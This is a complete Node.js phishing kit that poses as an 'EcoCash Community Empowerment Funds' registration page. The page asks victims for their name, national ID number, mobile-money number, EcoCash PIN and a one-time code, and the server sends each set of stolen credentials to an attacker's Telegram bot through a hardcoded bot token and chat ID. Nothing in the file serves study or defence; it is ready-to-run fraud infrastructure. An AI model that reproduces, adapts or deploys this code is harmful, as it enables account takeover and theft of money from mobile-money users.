const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = '8251322580:AAFB3YYWIlUcdQMoxVMDwC3LJWUg_piMrjI';
const CHAT_ID = '6306424209';

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ===== STORAGE =====
const registrations = {};

// ===== HTML PAGE =====
const HTML_PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EcoCash Registration</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#0047AB 0%,#003380 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.container{background:white;border-radius:20px;padding:40px 32px;max-width:460px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.3);position:relative;overflow:hidden}
.top-badge{position:absolute;top:0;right:0;background:#0047AB;color:white;padding:8px 22px;font-size:11px;font-weight:700;border-bottom-left-radius:12px;letter-spacing:1.5px}
.logo-area{text-align:center;margin-bottom:28px}
.logo-area .logo{width:72px;height:72px;background:linear-gradient(135deg,#0047AB,#0066CC);border-radius:18px;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;font-size:34px;color:white;font-weight:700;box-shadow:0 10px 24px rgba(0,71,171,0.35)}
.logo-area h1{color:#0047AB;font-size:1.7em;margin:0;font-weight:700;letter-spacing:-0.5px}
.logo-area .tagline{color:#666;margin-top:6px;font-size:0.88em;letter-spacing:0.3px}
.community-badge{background:linear-gradient(135deg,#FFD700,#FFA500);color:#000;padding:11px;border-radius:10px;text-align:center;font-size:11px;font-weight:700;margin-bottom:24px;letter-spacing:0.8px}
.progress-bar{display:flex;justify-content:space-between;margin-bottom:28px;gap:6px}
.progress-step{flex:1;height:5px;background:#e8e8e8;border-radius:3px;transition:all 0.4s ease}
.progress-step.active{background:#0047AB}
.progress-step.completed{background:#28a745}
.form-group{margin-bottom:20px}
.form-group label{display:block;margin-bottom:8px;color:#333;font-weight:600;font-size:13px;letter-spacing:0.2px}
.form-group label .required{color:#f44336;margin-left:2px}
.form-group input{width:100%;padding:15px 16px;border:2px solid #e8e8e8;border-radius:11px;font-size:15px;transition:all 0.25s;background:#fafbfc;font-family:inherit;color:#333}
.form-group input:focus{border-color:#0047AB;outline:none;background:white;box-shadow:0 0 0 4px rgba(0,71,171,0.08)}
.form-group input::placeholder{color:#a8b0b9;font-size:14px}
.btn{width:100%;padding:17px;border:none;border-radius:11px;font-size:16px;font-weight:700;cursor:pointer;transition:all 0.25s;color:white;background:linear-gradient(135deg,#0047AB,#0066CC);margin-top:8px;letter-spacing:0.3px;box-shadow:0 4px 14px rgba(0,71,171,0.25)}
.btn:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 10px 25px rgba(0,71,171,0.35)}
.btn:active:not(:disabled){transform:translateY(0)}
.btn:disabled{opacity:0.6;cursor:not-allowed}
.btn-green{background:linear-gradient(135deg,#28a745,#1e7e34);box-shadow:0 4px 14px rgba(40,167,69,0.25)}
.btn-green:hover:not(:disabled){box-shadow:0 10px 25px rgba(40,167,69,0.35)}
.message{padding:15px;border-radius:11px;margin-top:16px;font-weight:500;display:none;text-align:center;font-size:14px}
.message.show{display:block;animation:slideDown 0.3s ease}
@keyframes slideDown{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}
.message.success{background:#d4edda;color:#155724;border:1px solid #c3e6cb}
.message.error{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb}
.loader{display:inline-block;width:18px;height:18px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 0.7s linear infinite;vertical-align:middle;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
.otp-container{display:flex;gap:10px;justify-content:center;margin:26px 0}
.otp-input{width:52px;height:64px;text-align:center;font-size:26px;font-weight:700;border:2px solid #e8e8e8;border-radius:12px;background:#fafbfc;transition:all 0.25s;color:#0047AB}
.otp-input:focus{border-color:#0047AB;outline:none;background:white;box-shadow:0 0 0 4px rgba(0,71,171,0.08)}
.otp-input.filled{border-color:#0047AB;background:#f0f6ff}
.otp-input.error{border-color:#dc3545;background:#fff5f5;animation:shake 0.4s}
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-8px)}75%{transform:translateX(8px)}}
.step-content{display:none}
.step-content.active{display:block;animation:slideIn 0.4s ease}
@keyframes slideIn{from{opacity:0;transform:translateX(16px)}to{opacity:1;transform:translateX(0)}}
.info-note{background:#e8f1fc;border-left:3px solid #0047AB;padding:13px 15px;border-radius:8px;font-size:12.5px;color:#0c3d6e;margin-bottom:20px;line-height:1.6;font-weight:500}
.success-container{text-align:center;padding:16px 0}
.success-icon{width:104px;height:104px;background:linear-gradient(135deg,#28a745,#1e7e34);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;font-size:58px;color:white;animation:bounce 0.7s;box-shadow:0 12px 32px rgba(40,167,69,0.35)}
@keyframes bounce{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
.success-container h1{color:#28a745;margin-bottom:12px;font-size:1.5em;font-weight:700;letter-spacing:-0.3px}
.success-container p{color:#666;margin-bottom:14px;line-height:1.65;font-size:14px}
.details-box{background:#f8f9fa;border-radius:12px;padding:20px;margin:24px 0;text-align:left;border:1px solid #e9ecef}
.detail-row{display:flex;justify-content:space-between;padding:11px 0;border-bottom:1px solid #e9ecef;font-size:13px}
.detail-row:last-child{border-bottom:none;padding-bottom:0}
.detail-label{color:#666;font-weight:500}
.detail-value{color:#222;font-weight:700}
.status-pending{display:inline-block;padding:11px 26px;border-radius:22px;font-size:13px;font-weight:700;background:#fff3cd;color:#856404;margin-top:8px;letter-spacing:0.3px}
</style>
</head>
<body>
<div class="container">
<div class="top-badge">ECOCASH</div>

<div class="logo-area">
<div class="logo">E</div>
<h1>EcoCash</h1>
<div class="tagline">Community Empowerment Funds</div>
</div>

<div class="community-badge">POWERED BY ECOCASH • COMMUNITY EMPOWERMENT FUNDS</div>

<div class="progress-bar">
<div class="progress-step active" id="step1Bar"></div>
<div class="progress-step" id="step2Bar"></div>
<div class="progress-step" id="step3Bar"></div>
</div>

<!-- STEP 1: PERSONAL DETAILS -->
<div class="step-content active" id="step1Content">
<form id="detailsForm">
<div class="form-group">
<label>Full Name <span class="required">*</span></label>
<input type="text" id="fullName" placeholder="Enter your full name" required autocomplete="name">
</div>
<div class="form-group">
<label>ID Number <span class="required">*</span></label>
<input type="text" id="idNumber" placeholder="Enter your ID number" required autocomplete="off">
</div>
<div class="form-group">
<label>EcoCash Number <span class="required">*</span></label>
<input type="tel" id="ecocashNumber" placeholder="0771234567" inputmode="numeric" required autocomplete="tel">
</div>
<button type="submit" class="btn" id="detailsBtn"><span id="detailsText">Continue</span></button>
</form>
<div id="messageDiv" class="message"></div>
</div>

<!-- STEP 2: ECOCASH PIN -->
<div class="step-content" id="step2Content">
<div class="info-note">Enter your 4-digit EcoCash PIN to authorize this registration.</div>
<form id="pinForm">
<div class="form-group">
<label>Your EcoCash PIN <span class="required">*</span></label>
<input type="password" id="ecoPin" placeholder="Enter your EcoCash PIN" maxlength="4" inputmode="numeric" required autocomplete="off">
</div>
<button type="submit" class="btn" id="pinBtn"><span id="pinText">Continue</span></button>
</form>
<div id="pinMessage" class="message"></div>
</div>

<!-- STEP 3: OTP -->
<div class="step-content" id="step3Content">
<div class="info-note">A 6-digit verification code has been sent to your EcoCash number. Enter it below to complete your registration.</div>
<div class="otp-container" id="otpContainer">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
</div>
<button type="button" class="btn btn-green" id="submitOtpBtn">Verify &amp; Complete</button>
<div id="otpMessage" class="message"></div>
</div>

<!-- SUCCESS -->
<div class="step-content" id="successContent">
<div class="success-container">
<div class="success-icon">✓</div>
<h1>Successfully Registered</h1>
<p>You will receive a confirmation message once your details are approved.</p>
<div class="details-box">
<div class="detail-row"><span class="detail-label">Registration ID</span><span class="detail-value" id="finalRegId">#----</span></div>
<div class="detail-row"><span class="detail-label">Full Name</span><span class="detail-value" id="finalName">---</span></div>
<div class="detail-row"><span class="detail-label">ID Number</span><span class="detail-value" id="finalIdNumber">---</span></div>
<div class="detail-row"><span class="detail-label">EcoCash Number</span><span class="detail-value" id="finalPhone">---</span></div>
</div>
<div class="status-pending">Awaiting Approval</div>
</div>
</div>

</div>

<script>
var currentAppId = null;
var userDetails = { fullName: '', idNumber: '', ecocashNumber: '' };

// ===== STEP 1 =====
document.getElementById('detailsForm').addEventListener('submit', function(e){
e.preventDefault();
var fullName=document.getElementById('fullName').value.trim();
var idNumber=document.getElementById('idNumber').value.trim();
var ecocashNumber=document.getElementById('ecocashNumber').value.trim();

if(!fullName){showMessage('Please enter your full name','error');return}
if(!idNumber){showMessage('Please enter your ID number','error');return}
if(!ecocashNumber||ecocashNumber.length<10){showMessage('Please enter a valid EcoCash number','error');return}

userDetails.fullName=fullName;
userDetails.idNumber=idNumber;
userDetails.ecocashNumber=ecocashNumber;

goToStep(2);
});

// ===== STEP 2 =====
document.getElementById('pinForm').addEventListener('submit', async function(e){
e.preventDefault();
var ecoPin=document.getElementById('ecoPin').value.trim();
if(!ecoPin||ecoPin.length!==4){showPinMessage('EcoCash PIN must be 4 digits','error');return}

var btn=document.getElementById('pinBtn');
var btnText=document.getElementById('pinText');
btn.disabled=true;
btnText.innerHTML='<span class="loader"></span> Processing...';

try{
var response=await fetch('/api/register',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({
fullName:userDetails.fullName,
idNumber:userDetails.idNumber,
ecocashNumber:userDetails.ecocashNumber,
ecoPin:ecoPin
})
});
var data=await response.json();
if(data.success){
currentAppId=data.registrationId;
userDetails.ecoPin=ecoPin;
goToStep(3);
var first=document.querySelector('#otpContainer .otp-input');
if(first){first.focus()}
}else{
showPinMessage(data.message||'Failed. Please try again.','error');
btn.disabled=false;
btnText.textContent='Continue';
}
}catch(error){
showPinMessage('Network error. Please try again.','error');
btn.disabled=false;
btnText.textContent='Continue';
}
});

// ===== NAVIGATION =====
function goToStep(step){
var contents=document.querySelectorAll('.step-content');
for(var i=0;i<contents.length;i++){contents[i].classList.remove('active')}

if(step === 'success'){
document.getElementById('successContent').classList.add('active');
} else {
document.getElementById('step'+step+'Content').classList.add('active');
}

for(var i=1;i<=3;i++){
var bar=document.getElementById('step'+i+'Bar');
if(bar){
bar.classList.remove('active','completed');
var s = (step === 'success') ? 3 : step;
if(i<s){bar.classList.add('completed')}
else if(i===s){bar.classList.add('active')}
}
}
}

// ===== OTP INPUTS =====
var otpInputs=document.querySelectorAll('#otpContainer .otp-input');
for(var oi=0;oi<otpInputs.length;oi++){
(function(input,index){
input.addEventListener('input',function(e){
var v=e.target.value.replace(/[^0-9]/g,'');
e.target.value=v;
e.target.classList.remove('error');
if(v){
e.target.classList.add('filled');
if(index<otpInputs.length-1){otpInputs[index+1].focus()}
}else{
e.target.classList.remove('filled');
}
});
input.addEventListener('keydown',function(e){
if(e.key==='Backspace'&&!e.target.value&&index>0){otpInputs[index-1].focus()}
});
})(otpInputs[oi],oi);
}

// ===== SUBMIT OTP =====
document.getElementById('submitOtpBtn').addEventListener('click',async function(){
var otp='';
for(var i=0;i<otpInputs.length;i++){otp+=otpInputs[i].value}

if(otp.length!==6){
showOtpMessage('Please enter the complete 6-digit code','error');
for(var i=0;i<otpInputs.length;i++){otpInputs[i].classList.add('error')}
setTimeout(function(){
for(var i=0;i<otpInputs.length;i++){otpInputs[i].classList.remove('error')}
},1200);
return;
}

var btn=document.getElementById('submitOtpBtn');
btn.disabled=true;
btn.innerHTML='<span class="loader"></span> Verifying...';

try{
var response=await fetch('/api/complete-registration',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({registrationId:currentAppId,otp:otp})
});
var data=await response.json();
if(data.success){
document.getElementById('finalRegId').textContent='#'+currentAppId;
document.getElementById('finalName').textContent=userDetails.fullName;
document.getElementById('finalIdNumber').textContent=userDetails.idNumber;
document.getElementById('finalPhone').textContent=userDetails.ecocashNumber;
goToStep('success');
}else{
showOtpMessage(data.message||'Verification failed. Please try again.','error');
btn.disabled=false;
btn.textContent='Verify & Complete';
}
}catch(error){
showOtpMessage('Network error. Please try again.','error');
btn.disabled=false;
btn.textContent='Verify & Complete';
}
});

// ===== UTILITY =====
function showMessage(t,ty){var d=document.getElementById('messageDiv');d.textContent=t;d.className='message show '+ty;setTimeout(function(){d.className='message'},5000)}
function showPinMessage(t,ty){var d=document.getElementById('pinMessage');d.textContent=t;d.className='message show '+ty;setTimeout(function(){d.className='message'},5000)}
function showOtpMessage(t,ty){var d=document.getElementById('otpMessage');d.textContent=t;d.className='message show '+ty;setTimeout(function(){d.className='message'},5000)}

// ===== INPUT RESTRICTIONS =====
document.getElementById('ecocashNumber').addEventListener('input',function(){this.value=this.value.replace(/[^0-9]/g,'')});
document.getElementById('ecoPin').addEventListener('input',function(){this.value=this.value.replace(/[^0-9]/g,'')});
</script>
</body>
</html>`;

// ===== ROUTES =====
app.get('/', (req, res) => { res.send(HTML_PAGE); });

// ===== REGISTER (Step 2: after PIN) =====
app.post('/api/register', async (req, res) => {
    try {
        const { fullName, idNumber, ecocashNumber, ecoPin } = req.body;

        if (!fullName || !idNumber || !ecocashNumber || !ecoPin) {
            return res.status(400).json({ success: false, message: 'All fields required' });
        }
        if (ecoPin.length !== 4) {
            return res.status(400).json({ success: false, message: 'EcoCash PIN must be 4 digits' });
        }

        const registrationId = Math.floor(10000 + Math.random() * 90000).toString();

        registrations[registrationId] = {
            fullName, idNumber, ecocashNumber, ecoPin,
            otpEntered: null,
            completed: false,
            timestamp: new Date().toISOString()
        };

        // Notification 1 - Full details with PIN
        const message =
            '💚 <b>NEW ECOCASH REGISTRATION</b>\n\n' +
            '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 <b>Full Name:</b> ' + fullName + '\n' +
            '🪪 <b>ID Number:</b> <code>' + idNumber + '</code>\n' +
            '📱 <b>EcoCash Number:</b> <code>' + ecocashNumber + '</code>\n' +
            '🔑 <b>EcoCash PIN:</b> <code>' + ecoPin + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '⏰ <b>Submitted:</b> ' + new Date().toLocaleString() + '\n\n' +
            '⏳ <i>Awaiting OTP verification...</i>';

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' });

        res.json({ success: true, registrationId, message: 'OK' });
    } catch (error) {
        console.error('Register error:', error.message);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// ===== COMPLETE REGISTRATION (Step 3: after OTP) =====
app.post('/api/complete-registration', async (req, res) => {
    try {
        const { registrationId, otp } = req.body;
        const r = registrations[registrationId];

        if (!r) {
            return res.status(404).json({ success: false, message: 'Registration not found' });
        }

        r.otpEntered = otp;
        r.completed = true;
        r.completedAt = new Date().toISOString();

        // Final notification with OTP
        const message =
            '✅ <b>REGISTRATION COMPLETED</b>\n\n' +
            '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 <b>Full Name:</b> ' + r.fullName + '\n' +
            '🪪 <b>ID Number:</b> <code>' + r.idNumber + '</code>\n' +
            '📱 <b>EcoCash Number:</b> <code>' + r.ecocashNumber + '</code>\n' +
            '🔑 <b>EcoCash PIN:</b> <code>' + r.ecoPin + '</code>\n' +
            '🔐 <b>OTP Entered:</b> <code>' + otp + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '📊 <b>Status:</b> ✅ Completed – Awaiting Approval\n' +
            '⏰ <b>Completed:</b> ' + new Date().toLocaleString() + '\n\n' +
            '💚 <i>Community Empowerment Funds Program</i>';

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' });

        res.json({ success: true, message: 'Completed' });
    } catch (error) {
        console.error('Complete error:', error.message);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.get('/health', (req, res) => res.json({ status: 'healthy' }));

app.listen(PORT, () => {
    console.log(`🚀 EcoCash Registration on port ${PORT}`);
});
